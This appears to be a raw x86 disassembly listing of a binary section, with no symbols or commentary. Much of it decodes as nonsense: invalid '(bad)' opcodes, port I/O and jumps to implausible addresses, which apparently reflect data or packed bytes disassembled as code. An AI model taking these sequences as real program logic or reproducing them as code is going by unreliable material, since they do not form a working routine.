  402e23:	add    BYTE PTR [edx+esi*2],bl
  402e26:	test   BYTE PTR ds:0x434a05,bh
  402e2c:	sbb    al,0x3e
  402e2e:	out    dx,eax
  402e2f:	(bad)  
  402e30:	xor    DWORD PTR [ebx],ebx
  402e32:	dec    esp
  402e33:	inc    ecx
	...
  402e5c:	add    BYTE PTR [edx+ebp*8],bl
  402e5f:	gs stc 
  402e61:	pop    ebx
  402e62:	loopne 0x402e25
  402e64:	add    eax,0x4339c5
  402e69:	sbb    al,0x72
  402e6b:	add    eax,DWORD PTR [eax]
  402e6d:	xchg   ecx,eax
  402e6e:	out    dx,al
  402e6f:	shr    edi,cl
  402e71:	cmp    eax,DWORD PTR [eax]
  402e73:	xor    al,0xe8
  402e75:	add    DWORD PTR [ecx],0xf699ffd9
  402e7b:	out    0xef,eax
  402e7d:	and    ebx,DWORD PTR [edx+0x66]
  402e80:	xor    al,0x4
  402e82:	mov    ebp,0xd113d959
  402e87:	lods   al,BYTE PTR ds:[esi]
  402e88:	xlat   BYTE PTR ds:[ebx]
  402e89:	ins    BYTE PTR es:[edi],dx
  402e8a:	repz mov ebx,0xd15b5d4b
  402e90:	add    eax,0xec695b1c
  402e95:	jl     0x402f0f
  402e97:	jmp    0xdedb459f
  402e9c:	jle    0x402ee5
  402e9e:	pop    esp
  402e9f:	jmp    0x161911a7
  402ea4:	jmp    0x429ad7c
  402ea9:	sbb    al,0x5b
  402eab:	es jg  0x402e72
  402eae:	outs   dx,BYTE PTR ds:[esi]
  402eaf:	push   es
  402eb0:	fnstcw WORD PTR [ebx+0x4603e94e]
  402eb6:	pop    ebx
  402eb7:	add    DWORD PTR [ebx],0x36
  402eba:	pop    ebx
  402ebb:	add    DWORD PTR [ebx],0xffffff91
  402ebe:	fsub   st,st(1)
  402ec0:	call   0x402ec5
	...
  402ee9:	add    BYTE PTR [ebx-0x6678c682],bl
  402eef:	jg     0x402eb7
  402ef1:	fmul   DWORD PTR [ebx-0x777131d5]
  402ef7:	outs   dx,BYTE PTR ds:[esi]
  402ef8:	(bad)  
  402ef9:	fdivr  DWORD PTR [ebx+0x8]
  402efc:	mov    ebp,0xe9783aeb
  402f01:	add    edx,DWORD PTR [edi]
  402f03:	fidivr WORD PTR [esi+0xf]
  402f07:	pop    esp
  402f08:	jmp    0x31fff310
  402f0d:	inc    ebx
  402f0e:	sbb    al,0xf3
  402f10:	add    ecx,DWORD PTR [ebp+ebx*8+0x5a]
  402f14:	adc    DWORD PTR [ecx+0x40],0x5c0c867e
  402f1b:	dec    esi
  402f1c:	rcr    BYTE PTR gs:[ebx+ebx*2],cl
  402f20:	add    cl,ch
  402f22:	cwde   
  402f23:	stos   DWORD PTR es:[edi],eax
  402f24:	lea    esp,[ebx+ecx*2+0x6e]
  402f28:	jmp    DWORD PTR [esi+0x4f]
  402f2b:	sub    eax,ebp
  402f2d:	call   0x4ddf:0xe2ff7deb
  402f34:	test   BYTE PTR [ebx],dh
  402f36:	pop    ds
  402f37:	pop    ebx
  402f38:	add    BYTE PTR [eax+0x7a],dh
  402f3b:	jnp    0x402f2c
  402f3d:	ds aam 0xcf
  402f40:	test   DWORD PTR [ecx-0xc],eax
  402f43:	jge    0x402f44
  402f45:	cdq    
  402f46:	ja     0x402f04
  402f48:	dec    eax
  402f49:	test   al,0x1f
  402f4b:	jle    0x402f02
  402f4d:	or     DWORD PTR [eax],eax
	...
  402f77:	les    edi,FWORD PTR [ebp-0x1]
  402f7a:	and    DWORD PTR [ecx],0xb769005b
  402f80:	lods   al,BYTE PTR ds:[esi]
  402f81:	sti    
  402f82:	push   es
  402f83:	aam    0x51
  402f85:	shr    dh,0x33
  402f88:	mov    eax,0xda1fe900
  402f8d:	clc    
  402f8e:	call   0xe9dd04a7
  402f93:	pop    ds
  402f94:	pop    ebx
  402f95:	push   eax
  402f96:	fisubr WORD PTR [ebp+0x73d6ef72]
  402f9c:	sub    bh,bh
  402f9e:	xchg   esp,eax
  402f9f:	push   0x88c6ff6d
  402fa4:	inc    edx
  402fa5:	cmc    
  402fa6:	mov    esi,0xc185cf4b
  402fab:	cmp    DWORD PTR [ebp-0x1],0x19
  402faf:	lock retf 
  402fb1:	dec    eax
  402fb2:	sub    BYTE PTR [eax],ah
  402fb4:	jle    0x402f6b
  402fb6:	mov    DWORD PTR [ebx],edi
  402fb8:	jge    0x402fb9
  402fba:	add    DWORD PTR [esi],ebx
  402fbc:	pop    ebx
  402fbd:	add    BYTE PTR [ecx+0x30],ch
  402fc0:	in     al,dx
  402fc1:	cli    
  402fc2:	add    BYTE PTR [edx+0x29c00ba5],ah
  402fc8:	cmp    eax,0x759dbd83
  402fcd:	(bad)  
  402fce:	push   DWORD PTR [edi+ecx*1]
  402fd1:	cmp    edx,DWORD PTR [eax-0x2b]
  402fd4:	rol    DWORD PTR [ebp-0x5b9d04],cl
  402fda:	push   eax
	...
  403003:	add    BYTE PTR [ebp-0x7a],bl
  403006:	loop   0x403008
  403008:	cmc    
  403009:	dec    eax
  40300a:	lea    eax,[ebp-0x8b9f]
  403010:	xchg   ebp,eax
  403011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403012:	mov    ch,0xec
  403014:	bound  esp,QWORD PTR [edi+edi*8-0x54dc18]
  40301b:	(bad)  
  40301c:	frstor [ebp-0x5bdd174b]
  403022:	call   DWORD PTR [eax+0x32]
  403025:	jmp    0xdbe8:0xa412efec
  40302c:	mov    ecx,0xd5e8ffa5
  403031:	mov    al,ds:0x371effff
  403036:	lea    eax,[ebp-0x8a4f]
  40303c:	push   ebp
  40303d:	outs   dx,DWORD PTR ds:[esi]
  40303e:	fsub   st,st(2)
  403040:	test   DWORD PTR [eax+0x40],ebx
  403043:	push   eax
  403044:	add    bl,bl
  403046:	cld    
  403047:	out    dx,eax
  403048:	push   edx
  403049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40304a:	push   eax
  40304b:	(bad)  
  40304c:	clc    
  40304d:	jae    0x40303e
  40304f:	push   DWORD PTR [edx-0x4d0b4b90]
  403055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403056:	call   0xffe5db44
  40305b:	(bad)  
  40305c:	clc    
  40305d:	ja     0x40304e
  40305f:	push   DWORD PTR [edx+0x1cf7de70]
  403065:	in     eax,0xd6
  403067:	inc    DWORD PTR [eax]
	...
  403091:	cdq    
  403092:	out    0xe6,al
  403094:	(bad)  
  403095:	cmp    ebp,ebx
  403097:	mov    ?,esi
  403099:	xor    edi,ebp
  40309b:	aad    0x75
  40309d:	sub    dl,bl
  40309f:	into   
  4030a0:	jecxz  0x4030be
  4030a2:	jb     0x40310d
  4030a4:	add    BYTE PTR [ebx],bl
  4030a6:	(bad)  
  4030a8:	out    dx,eax
  4030a9:	adc    ebx,DWORD PTR ds:0x25106feb
  4030af:	(bad)  
  4030b0:	push   0x1c
  4030b2:	or     eax,0x150bec90
  4030b7:	(bad)  
  4030b8:	call   0x16773b
  4030bd:	cdq    
  4030be:	out    dx,al
  4030bf:	fsubp  st(7),st
  4030c1:	jecxz  0x4030ef
  4030c3:	xor    edi,edi
  4030c5:	xchg   ecx,eax
  4030c6:	popa   
  4030c7:	out    0xff,al
  4030c9:	shr    DWORD PTR [ecx+0x7a],cl
  4030cc:	jecxz  0x4030ea
  4030ce:	jb     0x403050
  4030d0:	rol    BYTE PTR [ecx+edi*4-0x2a],0xb5
  4030d5:	lods   al,BYTE PTR ds:[esi]
  4030d6:	fs (bad) 
  4030d8:	inc    esp
  4030da:	int    0xe6
  4030dc:	jmp    FWORD PTR [ebx-0x4c178006]
  4030e2:	ins    BYTE PTR es:[edi],dx
  4030e3:	aad    0xff
  4030e5:	shr    DWORD PTR [ecx-0x566c001b],1
  4030eb:	outs   dx,BYTE PTR ds:[esi]
  4030ec:	test   DWORD PTR [ebx-0x2b9a5e5c],0xff0432
	...
  40311e:	mov    cl,0x8d
  403120:	in     eax,0xff
  403122:	jae    0x4030cd
  403124:	dec    ecx
  403125:	loop   0x403143
  403127:	jb     0x403131
  403129:	shr    al,0xa8
  40312c:	mov    BYTE PTR [ebp-0x2a69a5bc],cl
  403132:	push   ebx
  403133:	iret   
  403134:	cdq    
  403135:	mov    DWORD PTR [ecx],ecx
  403137:	mul    BYTE PTR [eax]
  403139:	inc    ebx
  40313a:	sbb    al,0x88
  40313c:	inc    ebp
  40313d:	aad    0x71
  40313f:	jbe    0x4030d7
  403141:	aad    0x33
  403143:	jb     0x403100
  403145:	loope  0x403163
  403147:	pop    ebx
  403148:	fs jg  0x403183
  40314b:	imul   ebp,DWORD PTR [esi-0x2b],0x6c
  40314f:	jp     0x4030ed
  403151:	call   0xec9eac59
  403156:	inc    esi
  403157:	jle    0x403142
  403159:	add    ebx,DWORD PTR [ecx-0x4b72e65]
  40315f:	mov    al,0x55
  403161:	in     eax,0xf3
  403163:	jp     0x4031b6
  403165:	or     ebx,edi
  403167:	jp     0x40319f
  403169:	mov    ebx,DWORD PTR [ecx-0x242ac17d]
  40316f:	jp     0x4031cd
  403171:	in     al,dx
  403172:	ret    
  403173:	jp     0x403193
  403175:	in     al,dx
  403176:	adc    DWORD PTR [edx+0x16],esi
  403179:	aad    0x7f
  40317b:	add    al,0xa1
  40317d:	inc    edx
  40317e:	sbb    al,0x7a
  403180:	cmp    al,0xe0
	...
  4031aa:	add    bl,al
  4031ac:	jp     0x4031ac
  4031ae:	jmp    0x403166
  4031b0:	jl     0x40319b
  4031b2:	add    edx,DWORD PTR [edi]
  4031b4:	fwait
  4031b5:	jne    0x4031af
  4031b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031b8:	call   0x7ad4168e
  4031bd:	jb     0x403192
  4031bf:	xchg   edi,eax
  4031c0:	cmp    BYTE PTR [eax+0x4c],al
  4031c3:	fstp   QWORD PTR [edx-0x26]
  4031c6:	lahf   
  4031c7:	jnp    0x403179
  4031c9:	int    0xe4
  4031cb:	jae    0x403247
  4031cd:	shl    DWORD PTR [edx-0x16ffa483],1
  4031d3:	dec    eax
  4031d4:	mov    al,0xf0
  4031d6:	mov    esi,0xae87a70
  4031db:	cmp    bh,BYTE PTR [edx-0x1]
  4031de:	sahf   
  4031df:	call   0x5883:0x6896ef87
  4031e6:	jg     0x403238
  4031e8:	jp     0x403249
  4031ea:	daa    
  4031eb:	addr16 sahf 
  4031ed:	push   ebp
  4031ee:	jb     0x403233
  4031f0:	add    eax,0x713d8108
  4031f5:	jmp    FWORD PTR [esi-0x5c]
  4031f8:	mov    bh,bh
  4031fa:	sbb    al,0xdd
  4031fc:	and    al,BYTE PTR [ecx-0x17]
  4031ff:	mov    al,ds:0x17dcff5c
  403204:	jmp    0xb1c3:0x4fa6e542
  40320b:	pop    esi
  40320c:	pop    ebx
  40320d:	leave  
  40320e:	sub    eax,DWORD PTR [eax]
	...
  403238:	jmp    0x4032b3
  40323a:	push   esp
  40323b:	(bad)  
  40323c:	sti    
  40323d:	ffree  st(4)
  40323f:	xor    DWORD PTR [eax],ecx
  403241:	mov    ds:0x5b1f2145,al
  403246:	add    cl,ch
  403248:	pushf  
  403249:	test   DWORD PTR [edi],0xff4d53e9
  40324f:	xchg   esp,eax
  403250:	and    edi,DWORD PTR [edx+0x75]
  403253:	icebp  
  403254:	inc    ebp
  403255:	pop    ebx
  403256:	call   0xffb9f857
  40325b:	pusha  
  40325c:	loop   0x4032d4
  40325e:	jmp    0x403246
  403260:	fcomp  DWORD PTR [edi]
  403262:	cld    
  403263:	jmp    0x72408d87
  403268:	sub    eax,0x1828489e
  40326d:	xchg   BYTE PTR [ebx],dl
  40326f:	(bad)  
  403270:	in     eax,0x76
  403272:	cmp    eax,DWORD PTR [eax]
  403274:	inc    edx
  403275:	arpl   WORD PTR [ebp+0x9],si
  403278:	ret    0xf823
  40327b:	add    DWORD PTR [ebp+0x5d],esi
  40327e:	add    bl,ch
  403280:	inc    ebx
  403281:	clc    
  403282:	or     edi,DWORD PTR ds:[edx+0x13]
  403286:	jmp    0xe75b0e
  40328b:	jne    0x4032ca
  40328d:	mov    WORD PTR [ebp-0x4],?
  403290:	popf   
  403291:	loopne 0x403292
  403293:	call   FWORD PTR [edx+0xaf844f9]
  403299:	mov    eax,0x8c2
	...
  4032c2:	add    BYTE PTR [eax],al
  4032c4:	add    BYTE PTR ds:0xc63d8b34,dh
  4032ca:	aaa    
  4032cb:	inc    ecx
  4032cc:	add    BYTE PTR [esi+0x77],ch
  4032cf:	push   esi
  4032d0:	mov    ebp,DWORD PTR [edx]
  4032d2:	xchg   edi,eax
  4032d3:	imul   BYTE PTR ds:[edx-0x74]
  4032d7:	or     edi,edi
  4032d9:	rcl    BYTE PTR [eax+0x374605c7],1
  4032df:	inc    ecx
  4032e0:	add    ch,dh
  4032e2:	pop    esp
  4032e3:	add    BYTE PTR [eax],al
  4032e5:	mov    ah,BYTE PTR [ecx+0x34198b55]
  4032eb:	push   esi
  4032ec:	push   0xffffffc5
  4032ee:	lea    esi,[ebp+0x8]
  4032f1:	sub    eax,0x2afff9cd
  4032f6:	clc    
  4032f7:	idiv   edi
  4032f9:	nop
  4032fa:	je     0x4032e3
  4032fc:	jmp    0x403323
  4032fe:	pop    edi
  4032ff:	add    BYTE PTR [ebx+0xf765e1d],al
  403305:	sbb    ah,0x3f
  403308:	and    dl,BYTE PTR [eax]
  40330a:	je     0x403307
  40330c:	(bad)  
  40330d:	repnz pop ebp
  40330f:	mov    ecx,eax
  403311:	data16 rcr BYTE PTR [edi+0x68],0x1c
  403316:	leave  
  403317:	cmp    eax,DWORD PTR [ecx+0x1c]
  40331a:	xor    esp,ebx
  40331c:	push   0x7e
  40331e:	add    BYTE PTR [ebx],0xb
  403321:	pop    esp
  403322:	cs or  dh,al
  403325:	fadd   QWORD PTR [ebp+0x6a03]
	...
  40334f:	add    BYTE PTR [eax],al
  403351:	add    al,bh
  403353:	sbb    eax,DWORD PTR [edi+edx*2]
  403356:	inc    esp
  403357:	and    dh,ah
  403359:	add    BYTE PTR [ebp*2-0x37e68b3d],bl
  403360:	add    eax,DWORD PTR [eax]
  403362:	inc    edi
  403363:	test   ecx,ecx
  403365:	pop    es
  403366:	sbb    al,0x59
  403368:	fsubr  QWORD PTR [eax-0x7cfc7dc4]
  40336e:	and    al,0x85
  403370:	pop    edx
  403371:	add    esp,edx
  403373:	add    BYTE PTR [ebx],0x8b
  403376:	fistp  DWORD PTR [edi+0x7ddec932]
  40337c:	add    edx,DWORD PTR [ebp-0x69]
  40337f:	sbb    eax,0xfcf8c486
  403384:	inc    edi
  403385:	or     al,0x19
  403387:	xor    bl,0xff
  40338a:	jmp    0x40335d
  40338c:	fcmovnb st,st(5)
  40338e:	jmp    0x61ca05c3
  403393:	inc    esi
  403394:	shl    BYTE PTR [ebp+0x20],cl
  403397:	inc    ecx
  403398:	pop    eax
  403399:	cld    
  40339a:	retf   
  40339b:	into   
  40339c:	sti    
  40339d:	out    0xb7,eax
  40339f:	push   esi
  4033a0:	sar    bh,cl
  4033a2:	mov    ebx,0x29fef3ce
  4033a7:	outs   dx,BYTE PTR ds:[esi]
  4033a8:	shl    BYTE PTR [ebp-0x58],cl
  4033ab:	dec    ecx
  4033ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ad:	or     DWORD PTR [edx+eax*4],ebx
  4033b0:	shl    BYTE PTR [ebp-0x68],cl
  4033b3:	pop    ecx
  4033b4:	mov    dh,ch
	...
  4033de:	add    BYTE PTR [ebx+0x5ebbe65a],dl
  4033e4:	jmpw   0xcb1e
  4033e8:	xchg   BYTE PTR [edi],bh
  4033ea:	xor    eax,0xfc5477d3
  4033ef:	jnp    0x4033c2
  4033f1:	leave  
  4033f2:	add    al,0x1c
  4033f4:	retf   
  4033f5:	bnd ret 
  4033f7:	jmp    0xfa6d4a5b
  4033fc:	mov    eax,ds:0xe453fcab
  403401:	and    al,0xfc
  403403:	fwait
  403404:	jecxz  0x4033c7
  403406:	je     0x40339f
  403408:	in     eax,dx
  403409:	in     al,0x1c
  40340b:	pop    esp
  40340c:	jbe    0x40345e
  40340e:	shl    DWORD PTR [ebx],1
  403410:	ja     0x403398
  403412:	je     0x403442
  403414:	enter  0x8459,0xe3
  403418:	pop    edx
  403419:	std    
  40341a:	jmp    0x5bfc:0x53810a72
  403421:	jmp    0xe6310022
  403426:	xor    BYTE PTR [edi+0x15],ah
  403429:	and    dh,al
  40342b:	and    al,0x5b
  40342d:	pusha  
  40342e:	or     bl,BYTE PTR [edi-0x2d231263]
  403434:	mov    bl,0xe8
  403436:	add    ebx,DWORD PTR [ebx+ebx*2]
  403439:	xchg   esi,eax
  40343a:	sub    al,0x7a
  40343c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40343d:	sub    edi,esp
  40343f:	sar    esi,cl
  403441:	cdq    
  403442:	cmp    al,0x0
	...
  40346c:	pop    ebp
  40346d:	pop    ebx
  40346e:	xchg   ecx,eax
  40346f:	xor    edx,DWORD PTR [ebp+0x1c]
  403472:	jmp    0xeb6c852
  403477:	rol    DWORD PTR [edx+esi*4-0x4e],1
  40347b:	inc    edx
  40347c:	sbb    al,0x3
  40347e:	dec    eax
  40347f:	ds pop ebp
  403481:	pop    ebx
  403482:	add    BYTE PTR [ecx],al
  403484:	sbb    BYTE PTR [esi-0x1],dh
  403487:	out    dx,al
  403488:	imul   ebp
  40348a:	dec    edx
  40348b:	sub    BYTE PTR [eax],ah
  40348d:	add    ebp,DWORD PTR [edx+0x30]
  403490:	fistp  WORD PTR [edx-0x18]
  403493:	push   eax
  403494:	dec    ebp
  403495:	jbe    0x403496
  403497:	inc    ecx
  403498:	dec    ebx
  403499:	and    al,BYTE PTR [ecx-0x17]
  40349c:	(bad)  
  40349d:	lea    ecx,[ebx+0x28]
  4034a0:	sbb    BYTE PTR [ebx+0x766cb66a],al
  4034a6:	push   0x1c1142
  4034ab:	adc    DWORD PTR [ebx],eax
  4034ad:	and    al,0x41
  4034af:	jmp    0x973f471b
  4034b4:	dec    esp
  4034b5:	add    esp,DWORD PTR [ebx+0x22]
  4034b8:	fistp  WORD PTR [edx+0x68]
  4034bb:	mov    edi,fs
  4034bd:	sbb    eax,DWORD PTR [eax]
  4034bf:	xchg   ecx,eax
  4034c0:	jecxz  0x403537
  4034c2:	push   DWORD PTR [esi+0x77]
  4034c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c6:	dec    ebx
  4034c7:	sub    BYTE PTR [eax],bl
  4034c9:	add    esp,DWORD PTR [ebx]
  4034cb:	mov    dl,0x5e
  4034cd:	pop    ebx
  4034ce:	call   0x4034ef
	...
  4034f7:	add    BYTE PTR [eax],al
  4034f9:	in     eax,dx
  4034fa:	jne    0x4034fb
  4034fc:	shl    DWORD PTR [eax+0x57e94121],0x1c
  403503:	dec    ebx
  403504:	test   al,0x1f
  403506:	sub    DWORD PTR [esi],0x3e
  403509:	int3   
  40350a:	jne    0x4034cf
  40350c:	pushf  
  40350d:	pop    eax
  40350e:	xchg   DWORD PTR [ebx-0x3f9f285c],ecx
  403514:	popf   
  403515:	and    bl,bl
  403517:	cmp    cl,ch
  403519:	push   0x64
  40351b:	mov    eax,0x5b1fe9
  403520:	and    cl,bl
  403522:	pop    esi
  403523:	add    BYTE PTR [eax],al
  403525:	into   
  403526:	scas   eax,DWORD PTR es:[edi]
  403527:	jmp    0x403540
  403529:	xor    eax,0x88745c62
  40352e:	fnstcw WORD PTR [eax]
  403530:	das    
  403531:	or     BYTE PTR [ebx-0x46],ah
  403534:	add    DWORD PTR [ebp+0x59],esi
  403537:	add    bl,ch
  403539:	js     0x40351e
  40353b:	add    BYTE PTR [eax],al
  40353d:	test   DWORD PTR [ecx+0x40],ebx
  403540:	or     BYTE PTR ds:0xeee4755f,0x98
  403547:	leave  
  403548:	ret    0x5979
  40354b:	push   ebp
  40354c:	mov    esp,DWORD PTR [ecx+0x2d]
  40354f:	push   esi
  403550:	push   ebx
  403551:	mov    esi,0x35050c23
  403556:	pop    ebp
  403557:	add    BYTE PTR [eax],al
  403559:	test   BYTE PTR [esi+0x50],bh
  40355c:	call   0x403561
	...
  403585:	add    BYTE PTR [esi],dl
  403587:	xchg   ebx,eax
  403588:	(bad)  
  403589:	(bad)  
  40358a:	mov    esi,0xaed88ba6
  40358f:	adc    ecx,DWORD PTR [eax]
  403591:	mov    esi,eax
  403593:	pop    edx
  403594:	jmp    0x403598
  403596:	imul   esi,DWORD PTR [esi],0x6409c90b
  40359c:	cmp    BYTE PTR [esi],0xf
  40359f:	adc    al,0xf5
  4035a1:	or     ecx,DWORD PTR [ebx+edx*1+0x2]
  4035a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a6:	mov    esp,0x78aac051
  4035ab:	mov    dh,0x75
  4035ad:	out    0x6e,al
  4035af:	cwde   
  4035b0:	pop    ebx
  4035b1:	pop    esi
  4035b2:	xor    BYTE PTR [edi+0x29c508c2],0x56
  4035b9:	mov    ecx,0x58b9
  4035be:	inc    ebp
  4035bf:	dec    eax
  4035c0:	rcl    BYTE PTR [eax-0x536f3e1a],cl
  4035c6:	sbb    al,0xf2
  4035c8:	(bad)  
  4035c9:	mov    ch,0xdc
  4035cb:	movntsd QWORD PTR [edi+esi*8+0x409f9004],xmm1
  4035d4:	push   cs
  4035d5:	nop
  4035d6:	fild   QWORD PTR [ebp+0x7c09901e]
  4035dc:	jae    0x403561
  4035de:	pop    esi
  4035df:	cmp    eax,0x52404374
  4035e4:	je     0x403662
  4035e6:	es dec esi
  4035e8:	or     eax,0x90
	...
  403611:	add    BYTE PTR [eax],al
  403613:	repz jle 0x40361d
  403616:	add    al,0x1f
  403618:	rol    BYTE PTR [edx+0x3c],cl
  40361b:	fst    QWORD PTR [ecx]
  40361d:	dec    edi
  40361e:	or     ebx,DWORD PTR [eax]
  403620:	dec    eax
  403621:	je     0x4036a2
  403623:	sbb    dh,BYTE PTR [esi+0x44]
  403626:	nop
  403627:	pop    ds
  403628:	mov    dl,0x42
  40362a:	cmp    al,0xbd
  40362c:	icebp  
  40362d:	dec    esi
  40362e:	or     bh,al
  403630:	inc    edi
  403631:	je     0x4036b2
  403633:	sbb    DWORD PTR [esi+0x414c0346],esi
  403639:	(bad)
  40363c:	loopne 0x4035d2
  40363e:	shl    esi,0x83
  403641:	jp     0x403605
  403643:	and    edi,DWORD PTR [edx-0x56eb173c]
  403649:	jae    0x4035d6
  40364b:	xlat   BYTE PTR ds:[ebx]
  40364c:	icebp  
  40364d:	sub    al,0x5b
  40364f:	fbstp  TBYTE PTR [esi-0x52b01386]
  403655:	xor    eax,0xfbb697fc
  40365a:	(bad)  
  40365b:	xchg   edi,eax
  40365c:	mov    dh,0xf3
  40365e:	(bad)  
  40365f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403660:	mov    esi,0x490f8fff
  403665:	loop   0x403689
  403667:	lods   al,BYTE PTR ds:[esi]
  403668:	pop    edx
  403669:	mov    eax,0x1de8b473
  40366e:	into   
  40366f:	mov    ebx,0x32bc6cca
  403674:	arpl   WORD PTR [ebx-0x3c],ax
	...
  40369f:	add    BYTE PTR [edx+eiz*2+0x72be4259],dh
  4036a6:	pop    ecx
  4036a7:	sub    al,0xac
  4036a9:	xlat   BYTE PTR ds:[ebx]
  4036aa:	das    
  4036ab:	pop    es
  4036ac:	lods   al,BYTE PTR ds:[esi]
  4036ad:	xlat   BYTE PTR ds:[ebx]
  4036ae:	add    BYTE PTR [edi],al
  4036b0:	lods   al,BYTE PTR ds:[esi]
  4036b1:	repz (bad) 
  4036b3:	je     0x40364c
  4036b5:	xchg   edi,eax
  4036b6:	jns    0x4036e6
  4036b8:	fisttp DWORD PTR [edi]
  4036ba:	mov    al,ds:0x345b20c2
  4036bf:	jns    0x403739
  4036c1:	fldcw  WORD PTR [ebp-0x418c9d20]
  4036c7:	xor    DWORD PTR [edi],eax
  4036c9:	nop
  4036ca:	fs inc edi
  4036cc:	push   eax
  4036cd:	or     al,BYTE PTR [ecx-0x40]
  4036d0:	aam    0x19
  4036d2:	jmp    0x31ba40a3
  4036d7:	inc    ebx
  4036d8:	sbb    al,0x83
  4036da:	jae    0x403689
  4036dc:	sbb    al,0x5b
  4036de:	loop   0x4036a3
  4036e0:	mov    cl,0x38
  4036e2:	xchg   BYTE PTR [edi+0xc],dl
  4036e5:	je     0x4036db
  4036e7:	inc    DWORD PTR [ebp+0x1304035e]
  4036ed:	jmp    0x6fd203d2
  4036f2:	push   ecx
  4036f3:	test   ebx,esp
  4036f5:	pop    ebx
  4036f6:	jmp    0xe828f2f3
  4036fb:	inc    eax
  4036fc:	repz call 0x92bf134e
  403702:	jmp    0x40370a
	...
  40372b:	add    BYTE PTR [eax],al
  40372d:	pop    ss
  40372e:	xchg   esi,eax
  40372f:	out    dx,al
  403730:	xchg   cl,ah
  403732:	pop    ebx
  403733:	add    cl,ch
  403735:	pop    ds
  403736:	loopne 0x4036bd
  403738:	cmp    bl,dl
  40373a:	jb     0x40373b
  40373c:	mov    ecx,0xe9015767
  403741:	pop    ds
  403742:	or     DWORD PTR [ebp+0x37],0x18
  403746:	pop    ebx
  403747:	or     ebp,DWORD PTR [ecx]
  403749:	test   eax,0x1fe9acde
  40374e:	pop    ebx
  40374f:	cmp    eax,0x5b1ee5
  403754:	out    0x98,al
  403756:	mov    esp,0x51fe900
  40375b:	add    BYTE PTR [edx+ebx*4+0x6e],dh
  40375f:	(bad)  
  403760:	fisubr WORD PTR [eax+0xb]
  403763:	call   0x9bf983
  403768:	pop    esp
  403769:	mov    ds:0x50c6fe6e,al
  40376e:	or     ebp,eax
  403770:	sub    DWORD PTR [edx+0x72],ebp
  403773:	jmp    edx
  403775:	pop    edi
  403776:	call   0x23db7896
  40377b:	inc    ecx
  40377c:	jmp    0xa0340f43
  403781:	push   0xe5815072
  403786:	push   0xe8588eff
  40378b:	pop    es
  40378c:	sbb    DWORD PTR [eax-0x68],eax
  40378f:	idiv   BYTE PTR [esi+0x0]
	...
  4037ba:	call   0x6ab64744
  4037bf:	arpl   WORD PTR [ebp-0x8f139c],cx
  4037c5:	dec    di
  4037c7:	and    DWORD PTR [eax+0x57],0xffffffe8
  4037cb:	jno    0x403756
  4037cd:	ins    BYTE PTR es:[edi],dx
  4037ce:	shl    DWORD PTR [eax-0x1],cl
  4037d1:	dec    esi
  4037d2:	inc    ebp
  4037d3:	pop    ebx
  4037d4:	push   0x0
  4037d6:	cmc    
  4037d7:	adc    eax,DWORD PTR [edx]
  4037d9:	push   0xffffffc5
  4037db:	adc    eax,DWORD PTR [ebx]
  4037dd:	push   0xc0005dc5
  4037e2:	cli    
  4037e3:	enter  0xfeec,0xfa
  4037e7:	sahf   
  4037e8:	call   0x9e304c
  4037ed:	mov    DWORD PTR [eax-0x528bbf5b],eax
  4037f3:	sahf   
  4037f4:	jne    0x403806
  4037f6:	sbb    cl,BYTE PTR [ecx]
  4037f8:	or     al,0xff
  4037fa:	adc    BYTE PTR [esi-0x60e70818],ah
  403800:	dec    DWORD PTR [ebx-0x78a60d3]
  403806:	ins    DWORD PTR es:[edi],dx
  403807:	xor    ebx,ebp
  403809:	add    BYTE PTR [ebp+0x7e75da70],al
  40380f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403810:	mov    ch,0xec
  403812:	pop    ebx
  403813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403814:	(bad)  
  403815:	call   0x40fbff
  40381a:	call   0x0:0xfeeccb
	...
  403845:	add    BYTE PTR [eax],al
  403847:	mov    ah,BYTE PTR [ebp-0x5a789618]
  40384d:	dec    DWORD PTR [ebx-0x3d36be8a]
  403853:	dec    ecx
  403854:	pop    ebp
  403855:	push   ebp
  403856:	mov    ebx,DWORD PTR [ecx-0x64133b29]
  40385c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40385d:	call   DWORD PTR [ebx-0x66]
  403860:	or     ecx,DWORD PTR [edi+edi*8]
  403863:	adc    BYTE PTR [ebp+0x67],dh
  403866:	int3   
  403867:	cmp    eax,0xd0ff0016
  40386c:	ja     0x4038b6
  40386e:	inc    ecx
  40386f:	cmc    
  403870:	xchg   esp,eax
  403871:	pop    edx
  403872:	cmc    
  403873:	pop    edx
  403874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403875:	or     eax,eax
  403877:	sbb    al,0x79
  403879:	sbb    dl,0x1c
  40387c:	add    BYTE PTR [ebx],0x2b
  40387f:	(bad)  
  403880:	out    0x80,eax
  403882:	out    dx,eax
  403883:	fidiv  DWORD PTR [ecx]
  403885:	retf   
  403886:	push   eax
  403887:	inc    esp
  403888:	jle    0x40388e
  40388a:	add    BYTE PTR [edx+ebx*1],bl
  40388d:	xor    ebx,ebp
  40388f:	sbb    al,0x82
  403891:	(bad)  
  403892:	mov    edi,0x88f62b
  403897:	sbb    al,0x82
  403899:	or     BYTE PTR [ebx*1-0x64f0fc7e],al
  4038a0:	xor    al,0x4
  4038a2:	add    BYTE PTR [edi+edi*8],bl
  4038a5:	inc    eax
  4038a6:	cld    
  4038a7:	in     al,dx
  4038a8:	pop    ecx
  4038a9:	pop    edi
  4038aa:	jmp    0x4038af
	...
  4038d3:	add    BYTE PTR [ebx+0x73857881],cl
  4038d9:	js     0x4038a5
  4038db:	dec    esp
  4038dd:	mov    DWORD PTR [edx],edi
  4038df:	std    
  4038e0:	jae    0x40386b
  4038e2:	(bad)  
  4038e3:	mov    edi,0xbd5b7df1
  4038e8:	aam    0x42
  4038ea:	add    al,0x8d
  4038ec:	mov    eax,ds:0x53ffc9a1
  4038f1:	push   edx
  4038f2:	fmul   QWORD PTR [ecx-0x353eaf]
  4038f8:	leave  
